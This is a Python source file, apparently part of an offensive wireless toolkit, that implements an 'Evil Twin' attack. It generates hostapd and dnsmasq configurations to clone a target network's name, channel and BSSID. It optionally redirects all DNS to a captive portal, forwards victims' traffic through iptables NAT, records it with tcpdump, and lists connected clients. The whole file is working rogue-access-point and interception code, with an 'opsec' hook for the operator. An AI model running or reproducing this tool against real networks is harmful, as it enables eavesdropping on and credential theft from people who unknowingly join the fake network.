"""Evil Twin module — rogue AP creation for client capture."""

from __future__ import annotations

import os
import signal
import subprocess
import tempfile
import time
from dataclasses import dataclass

from rich.console import Console

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("eviltwin")


@dataclass
class EvilTwinConfig:
    essid: str
    channel: int
    interface: str
    bssid: str | None = None
    encryption: str = "open"  # open | wpa2
    wpa_passphrase: str | None = None
    dhcp_range: str = "192.168.87.10,192.168.87.50,12h"
    gateway_ip: str = "192.168.87.1"
    netmask: str = "255.255.255.0"
    dns_server: str = "8.8.8.8"
    captive_portal: bool = False
    capture_traffic: bool = True


class EvilTwinModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self._procs: list[subprocess.Popen] = []
        self._tmpdir: tempfile.TemporaryDirectory | None = None
        self._iptables_rules: list[list[str]] = []
        self._ip_forward_was_enabled: bool = False

    def start(self, twin_config: EvilTwinConfig) -> bool:
        console.print(f"[cyan]Starting Evil Twin: \"{twin_config.essid}\" on ch{twin_config.channel}[/cyan]")
        log.info("Starting Evil Twin: essid=%s, channel=%d, interface=%s",
                 twin_config.essid, twin_config.channel, twin_config.interface)
        self.opsec.pre_operation()

        self._tmpdir = tempfile.TemporaryDirectory(prefix="voidfreq_et_")
        tmpdir = self._tmpdir.name

        hostapd_conf = self._generate_hostapd_conf(twin_config, tmpdir)
        dnsmasq_conf = self._generate_dnsmasq_conf(twin_config, tmpdir)

        if not self._setup_interface(twin_config):
            return False

        if not self._start_hostapd(hostapd_conf):
            self.stop()
            return False

        time.sleep(2)

        if not self._start_dnsmasq(dnsmasq_conf):
            self.stop()
            return False

        self._setup_nat(twin_config)

        if twin_config.capture_traffic:
            self._start_traffic_capture(twin_config, tmpdir)

        console.print("[green bold]Evil Twin active![/green bold]")
        console.print(f"[dim]ESSID: {twin_config.essid}[/dim]")
        console.print(f"[dim]Gateway: {twin_config.gateway_ip}[/dim]")
        console.print(f"[dim]DHCP: {twin_config.dhcp_range}[/dim]")

        return True

    def stop(self) -> None:
        log.info("Shutting down Evil Twin")
        console.print("[yellow]Shutting down Evil Twin...[/yellow]")

        for proc in self._procs:
            try:
                proc.send_signal(signal.SIGTERM)
                proc.wait(timeout=5)
            except Exception:
                proc.kill()

        self._procs.clear()

        for rule in self._iptables_rules:
            delete_rule = [r if r != "-A" else "-D" for r in rule]
            subprocess.run(["sudo", "iptables"] + delete_rule, capture_output=True)
        self._iptables_rules.clear()

        if not self._ip_forward_was_enabled:
            subprocess.run(
                ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                capture_output=True,
            )

        if self._tmpdir:
            self._tmpdir.cleanup()
            self._tmpdir = None

        self.opsec.cleanup()
        console.print("[green]Evil Twin stopped[/green]")

    def _generate_hostapd_conf(self, tc: EvilTwinConfig, tmpdir: str) -> str:
        path = os.path.join(tmpdir, "hostapd.conf")

        lines = [
            f"interface={tc.interface}",
            f"ssid={tc.essid}",
            f"channel={tc.channel}",
            "driver=nl80211",
            "hw_mode=g",
            "ieee80211n=1",
        ]

        if tc.bssid:
            lines.append(f"bssid={tc.bssid}")

        if tc.encryption == "wpa2" and tc.wpa_passphrase:
            lines.extend([
                "wpa=2",
                f"wpa_passphrase={tc.wpa_passphrase}",
                "wpa_key_mgmt=WPA-PSK",
                "rsn_pairwise=CCMP",
            ])

        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")

        return path

    def _generate_dnsmasq_conf(self, tc: EvilTwinConfig, tmpdir: str) -> str:
        path = os.path.join(tmpdir, "dnsmasq.conf")

        lines = [
            f"interface={tc.interface}",
            f"dhcp-range={tc.dhcp_range}",
            f"dhcp-option=3,{tc.gateway_ip}",
            f"dhcp-option=6,{tc.dns_server}",
            f"server={tc.dns_server}",
            "log-queries",
            f"log-facility={os.path.join(tmpdir, 'dnsmasq.log')}",
            "no-resolv",
            "no-hosts",
        ]

        if tc.captive_portal:
            lines.append(f"address=/#/{tc.gateway_ip}")

        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")

        return path

    def _setup_interface(self, tc: EvilTwinConfig) -> bool:
        cmds = [
            ["sudo", "ip", "link", "set", tc.interface, "down"],
            ["sudo", "ip", "addr", "flush", "dev", tc.interface],
            ["sudo", "ip", "addr", "add", f"{tc.gateway_ip}/24", "dev", tc.interface],
            ["sudo", "ip", "link", "set", tc.interface, "up"],
        ]

        for cmd in cmds:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                console.print(f"[red]Interface setup failed: {result.stderr}[/red]")
                return False

        return True

    def _start_hostapd(self, conf_path: str) -> bool:
        proc = subprocess.Popen(
            ["sudo", "hostapd", conf_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        time.sleep(2)
        if proc.poll() is not None:
            stderr = proc.stderr.read().decode() if proc.stderr else ""
            console.print(f"[red]hostapd failed to start: {stderr}[/red]")
            return False

        self._procs.append(proc)
        console.print("[dim]hostapd started[/dim]")
        return True

    def _start_dnsmasq(self, conf_path: str) -> bool:
        proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", conf_path, "--no-daemon"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        time.sleep(1)
        if proc.poll() is not None:
            stderr = proc.stderr.read().decode() if proc.stderr else ""
            console.print(f"[red]dnsmasq failed to start: {stderr}[/red]")
            return False

        self._procs.append(proc)
        console.print("[dim]dnsmasq started[/dim]")
        return True

    def _setup_nat(self, tc: EvilTwinConfig) -> None:
        fwd_check = subprocess.run(
            ["sysctl", "-n", "net.ipv4.ip_forward"],
            capture_output=True, text=True,
        )
        self._ip_forward_was_enabled = fwd_check.stdout.strip() == "1"

        subprocess.run(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True,
        )

        internet_iface = self._get_default_route_iface()
        if not internet_iface:
            console.print("[yellow]No default route found — no internet forwarding[/yellow]")
            return

        rules = [
            ["-t", "nat", "-A", "POSTROUTING",
             "-o", internet_iface, "-j", "MASQUERADE"],
            ["-A", "FORWARD",
             "-i", tc.interface, "-o", internet_iface, "-j", "ACCEPT"],
            ["-A", "FORWARD",
             "-i", internet_iface, "-o", tc.interface,
             "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
        ]

        for rule in rules:
            subprocess.run(["sudo", "iptables"] + rule, capture_output=True)
            self._iptables_rules.append(rule)

        console.print(f"[dim]NAT configured: {tc.interface} → {internet_iface}[/dim]")

    def _get_default_route_iface(self) -> str | None:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True,
        )
        parts = result.stdout.split()
        if "dev" in parts:
            idx = parts.index("dev")
            if idx + 1 < len(parts):
                return parts[idx + 1]
        return None

    def _start_traffic_capture(self, tc: EvilTwinConfig, tmpdir: str) -> None:
        capture_path = os.path.join(tmpdir, "eviltwin_capture.pcap")
        proc = subprocess.Popen(
            ["sudo", "tcpdump",
             "-i", tc.interface,
             "-w", capture_path,
             "-U"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._procs.append(proc)
        console.print(f"[dim]Traffic capture → {capture_path}[/dim]")

    def get_connected_clients(self, interface: str) -> list[dict]:
        result = subprocess.run(
            ["iw", "dev", interface, "station", "dump"],
            capture_output=True, text=True,
        )

        clients = []
        current: dict = {}

        for line in result.stdout.split("\n"):
            if line.startswith("Station"):
                if current:
                    clients.append(current)
                current = {"mac": line.split()[1]}
            elif "signal:" in line:
                current["signal"] = line.split(":")[1].strip()
            elif "connected time:" in line:
                current["connected_time"] = line.split(":")[1].strip()
            elif "rx bytes:" in line:
                current["rx_bytes"] = line.split(":")[1].strip()
            elif "tx bytes:" in line:
                current["tx_bytes"] = line.split(":")[1].strip()

        if current:
            clients.append(current)

        return clients
